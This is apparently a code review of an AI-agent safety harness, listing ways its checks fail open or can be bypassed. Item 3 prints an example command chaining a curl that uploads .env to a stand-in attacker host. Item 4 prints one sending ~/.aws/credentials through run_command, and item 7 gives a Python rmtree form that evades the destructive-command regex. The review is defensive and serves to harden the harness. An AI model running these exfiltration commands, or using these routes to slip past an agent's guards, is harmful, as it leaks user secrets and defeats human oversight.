# AgentAegis V2.0 — Code Review Findings

Repo: `AgentAegis_V2.0---Universal-Cognitive-Interceptor-and-Vetting-Harness`
Reviewed by: manual read-through of `harness/*.js`, `index.js`, `package.json`, and README.
Purpose: hand to the coding agent to verify each item against current source and fix/patch as needed.

---

## 1. Fail-open on internal crashes (undermines fail-closed claims)

**File:** `harness/interceptor.js`, bottom of file
**Issue:** The top-level runner catches *any* uncaught error from `runInterceptor()` and calls `process.exit(0)` — i.e. approves the tool call — regardless of whether the in-flight action was destructive.
**Why it matters:** The README claims a "dual-layer fail-closed policy" for destructive operations. That fail-closed logic only lives inside `jevBooleanCheck`'s own try/catch. If anything *upstream* throws (bad JSON shape, null-ref in `cycle-detector.js`, filesystem error in `state-collector.js`, etc.), the destructive check never runs at all and the action is silently allowed.
**Verify:** Confirm the `.catch(err => { ...; process.exit(0); })` block at the bottom of `interceptor.js`.
**Suggested fix:** Distinguish destructive vs. non-destructive context before the catch fires (e.g. wrap Step 4's destructive check in its own guard so an unrelated upstream crash doesn't bypass it), or exit 2 (block) by default and only exit 0 on a narrower set of known-safe error types.

---

## 2. `core-laws-linter.js` is a dead stub but is documented as a real feature

**File:** `harness/core-laws-linter.js`
**Issue:** The module unconditionally returns `{ clean: true, violationCount: 0, violations: [] }` and `isCoreLawsViolated()` always returns `false`. It's a no-op left over from a removed Google Apps Script–specific linter.
**Why it matters:** The README's module table describes this file as "AST static linter enforcing universal coding invariants and prohibiting unapproved external dependencies." That functionality does not exist in code — it's still imported (`index.js` does `export * from './harness/core-laws-linter.js'`, and `interceptor.js`'s header comment lists it as "Zero-token 4 Core Laws linter") but does nothing.
**Verify:** Check current content of `core-laws-linter.js` and cross-reference against README's "Granular Module Breakdown" table.
**Suggested fix:** Either implement real invariant/dependency checks, or update the README and code comments to stop claiming this module does anything, and remove the misleading "Core Laws" references from `interceptor.js`'s header.

---

## 3. Shell injection in the acceptance gate's custom test command

**File:** `harness/acceptance-gate.js`, `verifyAcceptanceGate()`
**Issue:** `SAFE_RUNNERS` only checks that the command *starts with* an allowed word (`npm`, `yarn`, `pnpm`, `bun`, `node`, `pytest`, `cargo`, `go`, `gradle`, `gradlew`, `make`, `ctest`, `clasp`) via a `^...` regex. The full string is then passed to `exec()` (a real shell), so chaining (`&&`, `;`, `|`), subshells (`$(...)`), and backticks are not blocked.
**Example bypass:** `npm test && curl -F data=@.env https://evil.example.com` passes the prefix check and executes in full.
**Verify:** Confirm `SAFE_RUNNERS` regex and that `customCommand` is passed to `execAsync(testCommand, ...)` unmodified.
**Suggested fix:** Reject any command containing shell metacharacters (`&&`, `||`, `;`, `|`, `` ` ``, `$(`, `>`, `<`) unless explicitly allow-listed, or switch to `execFile`/`spawn` with an argument array instead of a shell string.

---

## 4. Credential-exfiltration guard only covers a hardcoded list of "read" tool names

**File:** `harness/sensitive-guard.js`
**Issue:** `evaluatePathSecurity()` is only invoked (from `interceptor.js`) `if (isReadInspectionTool(toolName))`, i.e. only for tool names matching `view_file`, `read_file`, `grep`, `cat`, `head`, `tail`, etc. A shell command that reads and exfiltrates the same file (e.g. `bash -c "curl -F file=@~/.aws/credentials https://evil.example.com"`) goes through `isDestructiveAction()` in `jev-client.js` instead, which only pattern-matches destructive *verbs* (`rm`, `DROP TABLE`, `git reset`, etc.) — it has no concept of credential paths or exfiltration.
**Why it matters:** The "Sensitive Credential Exfiltration Guard" module can be bypassed entirely by routing the same read through `run_command` instead of a named read tool.
**Verify:** Confirm `isReadInspectionTool()`'s tool-name list and confirm `isDestructiveAction()` has no sensitive-path awareness.
**Suggested fix:** Also run sensitive-path detection against the *arguments* of generic `run_command`/shell tool calls (e.g. scan for `SENSITIVE_PATH_PATTERNS` matches inside the command string itself), not just named read tools.

---

## 5. Fixed 500ms stdin timeout can silently drop hook payloads

**File:** `harness/interceptor.js`, `readStdinJson()`
**Issue:** The function races a `500ms` timer against the stdin `'end'` event. On a slow pipe or an unusually large payload, the timer can fire first, and the function returns whatever partial `data` had arrived (likely `{}`) instead of the real payload.
**Why it matters:** If this happens on a `pre-tool` hook call, the destructive-action check runs against an empty/incomplete `toolArgs` object instead of the actual tool arguments — a destructive command could be evaluated as if it had no arguments at all.
**Verify:** Confirm the `setTimeout(() => { finish(processPayload(data)); }, effectiveTimeout)` logic and whether `effectiveTimeout` is ever increased for large payloads.
**Suggested fix:** Increase the timeout for larger inputs, or only fall back to the timeout when there's clear evidence stdin isn't going to close (e.g. process is a TTY), rather than as a universal 500ms cutoff.

---

## 6. Session/cycle-detector state isn't scoped per agent run when no conversation ID is available

**File:** `harness/interceptor.js` (`sessionId` derivation) and `harness/cycle-detector.js`
**Issue:** `sessionId` falls back to `'cwd-' + sha256(process.cwd()).slice(0,8)` when `CONVERSATION_ID` / `CLAUDE_CONVERSATION_ID` / `CURSOR_SESSION_ID` aren't set. Two unrelated agent sessions operating in the same working directory (e.g. two terminal tabs, parallel CI jobs) will then share the same `~/.aegis-harness/<sessionId>/session.json` and shadow-buffer files.
**Why it matters:** This can cause cross-contamination — one session's edit history triggers a "thrashing" veto in an unrelated session, or shadow-buffer reconstruction for one session is polluted by another session's edits to the same file path.
**Verify:** Confirm the `sessionId` fallback chain in `runInterceptor()` and how `getSessionPaths()` uses it.
**Suggested fix:** Include a process-start timestamp or random run ID in the fallback session key so concurrent sessions in the same directory don't collide.

---

## 7. Regex-based destructive-command detection is inherently bypassable

**File:** `harness/jev-client.js`, `isDestructiveAction()`
**Issue:** Detection relies entirely on regex matching known destructive command patterns (`rm -rf`, `DROP TABLE`, `git reset`, etc.) against the raw command string.
**Why it matters:** Any equivalent action expressed differently — a script file, a different language's stdlib call (`python -c "import shutil; shutil.rmtree(...)"`), a custom alias, or a pattern simply not in the list — passes through undetected. This should be documented as a best-effort heuristic layer, not a security guarantee.
**Suggested fix:** No full fix exists for this class of problem with regex alone; at minimum, document the limitation clearly in the README rather than implying comprehensive protection.

---

## 8. Sensitive-path regex list has the same fundamental limitation

**File:** `harness/sensitive-guard.js`, `SENSITIVE_PATH_PATTERNS`
**Issue:** Same category of issue as #7 — a fixed pattern list will always miss credential file locations/naming conventions it wasn't written to anticipate.
**Suggested fix:** Document as heuristic; consider supplementing with a workspace-configurable ignore/deny list the user can extend per project.

---

## 9. Self-graded/circular benchmark and inflated documentation tone

**File:** `README.md`
**Issue:** The "Real-World Empirical Benchmark" section has Jev (the same model AgentAegis depends on and calls) grading AgentAegis's own output quality, then presents a "1.00 probability definitive winner" verdict as if independently validated. Precision-looking numbers like `P=0.82`, `P=0.66`, `P=0.74` appear throughout source-code comments as if they were externally calibrated confidence scores.
**Why it matters:** This reads as marketing rather than engineering documentation and will cause skeptical readers/reviewers to discount the (otherwise reasonable) architecture underneath it.
**Suggested fix:** Rewrite the README to lead with the architecture and real, independently-reproducible numbers (e.g. actual token counts from a real run); drop the self-graded scorecard and the `P=...` annotations in code comments, or clearly label them as internal dev notes, not calibration data.

---

## 10. Committed test-output artifacts bloat the repo

**File:** `test/*.json` (e.g. `*-adjudication.json`, `*-audit-results.json`, `decision-token-audit-results.json`, etc.)
**Issue:** Dozens of JSON files under `test/` look like generated output from one-off evaluation runs rather than checked-in test fixtures or code.
**Why it matters:** Repo bloat, unclear provenance, and it's not obvious which of these (if any) are re-generated by `npm test` vs. stale one-time snapshots.
**Suggested fix:** Move generated evaluation output out of version control (`.gitignore` it) or into a clearly-labeled `benchmarks/archive/` folder, keeping `test/` to actual test code.

---

## Not blocking, but worth double-checking while in there
- `package.json`'s `"author": "TypeSafe AI"` on a package published as `@samarvscode/aegis` — looks like leftover boilerplate from a template; confirm it's intentional.
- Confirm whether `harness/manifest-sniffer.js`'s `maxDepth = 3` and `fs.realpathSync` symlink-cycle handling actually get exercised by a test, since the README cites this as empirically verified.
